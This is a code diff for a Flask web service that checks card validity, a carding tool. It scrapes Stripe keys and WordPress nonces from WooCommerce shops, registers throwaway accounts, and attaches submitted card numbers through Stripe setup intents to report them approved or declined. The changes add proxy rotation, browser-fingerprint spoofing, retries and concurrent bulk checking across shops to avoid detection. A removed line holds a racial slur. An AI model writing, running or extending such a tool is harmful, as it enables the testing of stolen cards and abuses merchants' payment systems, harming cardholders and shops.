@@ -11,6 +11,15 @@ import logging
 import threading
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import urllib3
+import asyncio
+import aiohttp
+
+# Import utility modules
+from utils import (
+    ConfigManager, ProxyRotator, BrowserFingerprint, RetryHandler,
+    HTTPSessionManager, NonceExtractor, StripeKeyExtractor,
+    generate_random_credentials, async_fetch, async_post
+)
 
 # Disable SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -21,6 +30,15 @@ logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
 
+# Initialize configuration and utilities
+config_manager = ConfigManager("config.json")
+proxy_rotator = ProxyRotator(
+    config_manager.get("proxy_list", []),
+    config_manager.get("enable_proxy_rotation", False)
+)
+fingerprint = BrowserFingerprint(config_manager.get("user_agents", []))
+retry_handler = RetryHandler(**config_manager.get("retry_config", {}))
+http_session_manager = HTTPSessionManager(proxy_rotator, fingerprint, retry_handler)
 
 mass_check_results = {}
 mass_check_status = {}
@@ -942,120 +960,46 @@ def home():
     </body>
     </html>
     """)
-#Main Function Niggas Do Not Copy It
+
+
+# ============= STRIPE PROCESSING FUNCTIONS =============
+
 def get_stripe_key(domain):
+    """Extract Stripe publishable key from domain"""
     logger.debug(f"Getting Stripe key for domain: {domain}")
-    urls_to_try = [
-        f"https://{domain}/my-account/add-payment-method/",
-        f"https://{domain}/checkout/",
-        f"https://{domain}/wp-admin/admin-ajax.php?action=wc_stripe_get_stripe_params",
-        f"https://{domain}/?wc-ajax=get_stripe_params"
-    ]
     
-    patterns = [
-        r'pk_live_[a-zA-Z0-9_]+',
-        r'stripe_params[^}]*"key":"(pk_live_[^"]+)"',
-        r'wc_stripe_params[^}]*"key":"(pk_live_[^"]+)"',
-        r'"publishableKey":"(pk_live_[^"]+)"',
-        r'var stripe = Stripe[\'"]((pk_live_[^\'"]+))[\'"]'
-    ]
+    payment_urls = config_manager.get("payment_urls", [])
+    urls_to_try = [f"https://{domain}{path}" for path in payment_urls]
     
     for url in urls_to_try:
         try:
             logger.debug(f"Trying URL: {url}")
-            response = requests.get(url, headers={'User-Agent': UserAgent().random}, timeout=10, verify=False)
+            response = http_session_manager.get(url, timeout=10, allow_redirects=True)
             if response.status_code == 200:
-                for pattern in patterns:
-                    match = re.search(pattern, response.text)
-                    if match:                
-                        key_match = re.search(r'pk_live_[a-zA-Z0-9_]+', match.group(0))
-                        if key_match:
-                            logger.debug(f"Found Stripe key: {key_match.group(0)}")
-                            return key_match.group(0)
+                key = StripeKeyExtractor.extract(response.text)
+                if key:
+                    return key
         except Exception as e:
             logger.error(f"Error getting Stripe key from {url}: {e}")
             continue
-    
-    logger.debug("Using default Stripe key")
-    return "pk_live_51JwIw6IfdFOYHYTxyOQAJTIntTD1bXoGPj6AEgpjseuevvARIivCjiYRK9nUYI1Aq63TQQ7KN1uJBUNYtIsRBpBM0054aOOMJN"
 
-def extract_nonce_from_page(html_content, domain):
-    logger.debug(f"Extracting nonce from {domain}")
-    patterns = [
-        # WooCommerce Stripe patterns
-        r'createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([^"\']+)["\']',
-        r'wc_stripe_create_and_confirm_setup_intent["\']?[^}]*nonce["\']?:\s*["\']([^"\']+)["\']',
-        
-        # Standard WordPress nonce patterns
-        r'name=["\']_ajax_nonce["\'][^>]*value=["\']([^"\']+)["\']',
-        r'name=["\']_wpnonce["\'][^>]*value=["\']([^"\']+)["\']',
-        r'name=["\']woocommerce-register-nonce["\'][^>]*value=["\']([^"\']+)["\']',
-        r'name=["\']woocommerce-login-nonce["\'][^>]*value=["\']([^"\']+)["\']',
-        
-        # Data attributes
-        r'data-nonce=["\']([^"\']+)["\']',
-        r'data-_nonce=["\']([^"\']+)["\']',
-        r'data-security=["\']([^"\']+)["\']',
-        
-        # JavaScript variable patterns
-        r'var\s+wc_stripe_params\s*=\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"',
-        r'var\s+stripe_params\s*=\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"',
-        r'var\s+wc_checkout_params\s*=\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"',
-        
-        # Generic nonce patterns (more flexible)
-        r'nonce["\']?\s*:\s*["\']([a-zA-Z0-9]+)["\']',
-        r'"nonce"\s*:\s*"([a-zA-Z0-9]+)"',
-        r"'nonce'\s*:\s*'([a-zA-Z0-9]+)'",
-        
-        # REST API nonce header patterns
-        r'X-WP-Nonce["\']?\s*:\s*["\']([^"\']+)["\']',
-    ]
-    
-    for i, pattern in enumerate(patterns):
-        try:
-            match = re.search(pattern, html_content, re.IGNORECASE | re.DOTALL)
-            if match:
-                nonce = match.group(1).strip()
-                # Validate nonce is not empty and reasonable length
-                if nonce and len(nonce) > 5 and len(nonce) < 256:
-                    logger.debug(f"Found nonce using pattern {i}: {nonce[:20]}...")
-                    return nonce
-        except Exception as e:
-            logger.error(f"Error with pattern {i}: {e}")
-            continue
-    
-    # Log first 500 chars of HTML for debugging
-    logger.debug(f"No nonce found. HTML preview: {html_content[:500]}")
-    return None
+def create_http_session():
+    """Create a new HTTP session with all features"""
+    return HTTPSessionManager(proxy_rotator, fingerprint, retry_handler)
 
-def generate_random_credentials():
-    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
-    email = f"{username}@gmail.com"
-    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
-    return username, email, password
 
 def register_account(domain, session):
+    """Register account on domain"""
     logger.debug(f"Registering account on {domain}")
-    try:        
-        reg_response = session.get(f"https://{domain}/my-account/", verify=False)
-                
-        reg_nonce_patterns = [
-            r'name="woocommerce-register-nonce" value="([^"]+)"',
-            r'name=["\']_wpnonce["\'][^>]*value="([^"]+)"',
-            r'register-nonce["\']?:\s*["\']([^"\']+)["\']'
-        ]
+    try:
+        reg_response = session.get(f"https://{domain}/my-account/", timeout=10, allow_redirects=True)
         
-        reg_nonce = None
-        for pattern in reg_nonce_patterns:
-            match = re.search(pattern, reg_response.text)
-            if match:
-                reg_nonce = match.group(1)
-                break
+        reg_nonce = extract_nonce_from_page(reg_response.text, domain)
         
         if not reg_nonce:
             logger.debug("Could not extract registration nonce")
             return False, "Could not extract registration nonce"
-                
+        
         username, email, password = generate_random_credentials()
         
         reg_data = {
@@ -1071,7 +1015,7 @@ def register_account(domain, session):
             f"https://{domain}/my-account/",
             data=reg_data,
             headers={'Referer': f'https://{domain}/my-account/'},
-            verify=False
+            timeout=15
         )
         
         if 'Log out' in reg_result.text or 'My Account' in reg_result.text:
@@ -1080,14 +1024,17 @@ def register_account(domain, session):
         else:
             logger.debug("Registration failed")
             return False, "Registration failed"
-            
+    
     except Exception as e:
         logger.error(f"Registration error: {e}")
         return False, f"Registration error: {str(e)}"
 
+
 def process_card_enhanced(domain, ccx, use_registration=True):
+    """Process card payment with enhanced error handling and retries"""
     logger.debug(f"Processing card for domain: {domain}")
     ccx = ccx.strip()
+    
     try:
         n, mm, yy, cvc = ccx.split("|")
     except ValueError:
@@ -1100,53 +1047,32 @@ def process_card_enhanced(domain, ccx, use_registration=True):
     if "20" in yy:
         yy = yy.split("20")[1]
     
-    user_agent = UserAgent().random
     stripe_mid = str(uuid.uuid4())
     stripe_sid = str(uuid.uuid4()) + str(int(time.time()))
-
-    session = requests.Session()
-    session.headers.update({'User-Agent': user_agent})
+    
+    # Create session with all features (fingerprint, proxy rotation, retries)
+    session = create_http_session()
 
     stripe_key = get_stripe_key(domain)
 
     if use_registration:
-        registered, reg_message = register_account(domain, session)
-        
-    payment_urls = [
-        f"https://{domain}/my-account/add-payment-method/",
-        f"https://{domain}/checkout/",
-        f"https://{domain}/my-account/",
-        f"https://{domain}/wp-admin/admin-ajax.php",
-        f"https://{domain}/"
-    ]
+        registered, reg_message = register_account(domain, session.session)
+    
+    # Get payment URLs from config
+    payment_urls = [f"https://{domain}{path}" for path in config_manager.get("payment_urls", ["/"])]
     
     nonce = None
     html_content = ""
     for url in payment_urls:
         try:
             logger.debug(f"Trying to get nonce from: {url}")
-            response = session.get(
-                url, 
-                timeout=10, 
-                verify=False,
-                allow_redirects=True,
-                headers={
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                    'Accept-Language': 'en-US,en;q=0.5'
-                }
-            )
+            response = session.get(url, allow_redirects=True)
             if response.status_code == 200:
                 html_content = response.text
                 nonce = extract_nonce_from_page(html_content, domain)
                 if nonce:
                     logger.debug(f"Successfully extracted nonce from {url}")
                     break
-        except requests.exceptions.Timeout:
-            logger.error(f"Timeout getting nonce from {url}")
-            continue
-        except requests.exceptions.ConnectionError:
-            logger.error(f"Connection error getting nonce from {url}")
-            continue
         except Exception as e:
             logger.error(f"Error getting nonce from {url}: {e}")
             continue
@@ -1178,18 +1104,11 @@ def process_card_enhanced(domain, ccx, use_registration=True):
 
     try:
         logger.debug("Creating payment method")
-        pm_response = requests.post(
+        pm_response = session.post(
             'https://api.stripe.com/v1/payment_methods',
             data=payment_data,
-            headers={
-                'User-Agent': user_agent,
-                'accept': 'application/json',
-                'content-type': 'application/x-www-form-urlencoded',
-                'origin': 'https://js.stripe.com',
-                'referer': 'https://js.stripe.com/',
-            },
-            timeout=15,
-            verify=False
+            headers=fingerprint.get_stripe_headers(),
+            timeout=15
         )
         pm_data = pm_response.json()
 
@@ -1204,35 +1123,35 @@ def process_card_enhanced(domain, ccx, use_registration=True):
         logger.error(f"Payment Method Creation Failed: {e}")
         return {"Response": f"Payment Method Creation Failed: {str(e)}", "Status": "Declined"}
     
+    # Use configurable payloads
+    ajax_payloads = config_manager.get("ajax_payloads", [])
+    
     endpoints = [
         {'url': f'https://{domain}/', 'params': {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}},
         {'url': f'https://{domain}/wp-admin/admin-ajax.php', 'params': {}},
         {'url': f'https://{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', 'params': {}}
     ]
     
-    data_payloads = [
-        {
-            'action': 'wc_stripe_create_and_confirm_setup_intent',
-            'wc-stripe-payment-method': payment_method_id,
-            'wc-stripe-payment-type': 'card',
-            '_ajax_nonce': nonce,
-        },
-        {
-            'action': 'wc_stripe_create_setup_intent',
-            'payment_method_id': payment_method_id,
-            '_wpnonce': nonce,
-        }
-    ]
-
     for endpoint in endpoints:
-        for data_payload in data_payloads:
+        for payload_template in ajax_payloads:
             try:
+                # Build payload with actual values
+                data_payload = {}
+                for key, value in payload_template.get("fields", {}).items():
+                    if value == "payment_method_id":
+                        data_payload[key] = payment_method_id
+                    elif value == "nonce":
+                        data_payload[key] = nonce
+                    else:
+                        data_payload[key] = value
+                
+                data_payload['action'] = payload_template.get('action')
+                
                 logger.debug(f"Trying endpoint: {endpoint['url']} with payload: {data_payload}")
                 setup_response = session.post(
                     endpoint['url'],
                     params=endpoint.get('params', {}),
                     headers={
-                        'User-Agent': user_agent,
                         'Referer': f'https://{domain}/my-account/add-payment-method/',
                         'accept': '*/*',
                         'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
@@ -1240,17 +1159,16 @@ def process_card_enhanced(domain, ccx, use_registration=True):
                         'x-requested-with': 'XMLHttpRequest',
                     },
                     data=data_payload,
-                    timeout=15,
-                    verify=False
+                    timeout=15
                 )
-                                
+                
                 try:
                     setup_data = setup_response.json()
                     logger.debug(f"Setup response: {setup_data}")
                 except:
                     setup_data = {'raw_response': setup_response.text}
                     logger.debug(f"Setup raw response: {setup_response.text}")
-              
+            
                 if setup_data.get('success', False):
                     data_status = setup_data['data'].get('status')
                     if data_status == 'requires_action':
@@ -1258,7 +1176,7 @@ def process_card_enhanced(domain, ccx, use_registration=True):
                         return {"Response": "3D", "Status": "Declined"}
                     elif data_status == 'succeeded':
                         logger.debug("Payment succeeded")
-                        return {"Response": "Card Added ", "Status": "Approved"}
+                        return {"Response": "Card Added", "Status": "Approved"}
                     elif 'error' in setup_data['data']:
                         error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                         logger.error(f"Payment error: {error_msg}")
@@ -1279,6 +1197,17 @@ def process_card_enhanced(domain, ccx, use_registration=True):
 
     logger.error("All payment attempts failed")
     return {"Response": "All payment attempts failed", "Status": "Declined"}
+
+
+async def process_card_async(domain, cc, session_manager):
+    """Async card processing for bulk operations"""
+    try:
+        loop = asyncio.get_event_loop()
+        result = await loop.run_in_executor(None, process_card_enhanced, domain, cc, False)
+        return {"domain": domain, "card": cc, "result": result}
+    except Exception as e:
+        logger.error(f"Async processing error for {domain}: {e}")
+        return {"domain": domain, "card": cc, "error": str(e)}
 
 @app.route('/process')
 def process_request():
@@ -1324,6 +1253,7 @@ def process_request():
 
 @app.route('/bulk')
 def bulk_process_request():
+    """Process a card against multiple domains concurrently"""
     try:
         key = request.args.get('key')
         cc = request.args.get('cc')
@@ -1338,29 +1268,37 @@ def bulk_process_request():
             logger.error(f"Invalid card format: {cc}")
             return jsonify({"error": "Invalid card format. Use: NUMBER|MM|YY|CVV", "status": "Bad Request"}), 400
         
-        test_domains = [
+        # Get test domains from config or use defaults
+        test_domains = config_manager.get("test_domains", [
             "example-shop1.com",
-            "example-store2.com", 
+            "example-store2.com",
             "demo-woocommerce3.com"
-        ]
+        ])
         
         results = []
-        for domain in test_domains:
-            try:
-                result = process_card_enhanced(domain, cc)
-                # Ensure consistent response format
-                results.append({
-                    "Domain": domain,
-                    "Response": result.get("Response", result.get("response", "Unknown response")),
-                    "Status": result.get("Status", result.get("status", "Unknown status"))
-                })
-            except Exception as e:
-                logger.error(f"Error processing {domain}: {e}")
-                results.append({
-                    "Domain": domain,
-                    "Response": f"Error: {str(e)}",
-                    "Status": "Error"
-                })
+        
+        # Use ThreadPoolExecutor for concurrent processing
+        with ThreadPoolExecutor(max_workers=5) as executor:
+            futures = []
+            for domain in test_domains:
+                future = executor.submit(process_card_enhanced, domain, cc, False)
+                futures.append((domain, future))
+            
+            for domain, future in futures:
+                try:
+                    result = future.result(timeout=60)
+                    results.append({
+                        "Domain": domain,
+                        "Response": result.get("Response", result.get("response", "Unknown response")),
+                        "Status": result.get("Status", result.get("status", "Unknown status"))
+                    })
+                except Exception as e:
+                    logger.error(f"Error processing {domain}: {e}")
+                    results.append({
+                        "Domain": domain,
+                        "Response": f"Error: {str(e)}",
+                        "Status": "Error"
+                    })
         
         return jsonify({"results": results})
     except Exception as e:
@@ -1392,19 +1330,13 @@ def debug_nonce():
         "attempts": []
     }
     
-    urls = [
-        f"https://{domain}/my-account/add-payment-method/",
-        f"https://{domain}/checkout/",
-        f"https://{domain}/my-account/",
-    ]
+    payment_urls = [f"https://{domain}{path}" for path in config_manager.get("payment_urls", ["/"])]
     
-    user_agent = UserAgent().random
-    session = requests.Session()
-    session.headers.update({'User-Agent': user_agent})
+    session_manager = create_http_session()
     
-    for url in urls:
+    for url in payment_urls:
         try:
-            response = session.get(url, timeout=10, verify=False, allow_redirects=True)
+            response = session_manager.get(url, allow_redirects=True)
             nonce = extract_nonce_from_page(response.text, domain)
             
             attempt = {
@@ -1425,9 +1357,40 @@ def debug_nonce():
     return jsonify(results)
 
 
-@app.route('/health')
-def health_check():
-    return jsonify({"status": "healthy"}), 200
+@app.route('/debug/config')
+def debug_config():
+    """View current configuration"""
+    return jsonify({
+        "proxy_enabled": config_manager.get("enable_proxy_rotation", False),
+        "proxy_count": len(config_manager.get("proxy_list", [])),
+        "retry_config": config_manager.get("retry_config", {}),
+        "payment_urls": config_manager.get("payment_urls", []),
+        "test_domains": config_manager.get("test_domains", []),
+        "ajax_payloads_count": len(config_manager.get("ajax_payloads", []))
+    })
+
+
+@app.route('/debug/session')
+def debug_session():
+    """Test session creation with all features"""
+    session_manager = create_http_session()
+    
+    return jsonify({
+        "fingerprint": {
+            "user_agent": fingerprint.get_user_agent(),
+            "headers_count": len(fingerprint.get_headers())
+        },
+        "proxy": {
+            "enabled": proxy_rotator.enable_rotation,
+            "proxy_list_size": len(proxy_rotator.proxy_list),
+            "current_index": proxy_rotator.current_index
+        },
+        "retry": {
+            "max_retries": retry_handler.max_retries,
+            "initial_delay": retry_handler.initial_delay,
+            "backoff_factor": retry_handler.backoff_factor
+        }
+    })
 
 
 @app.errorhandler(404)
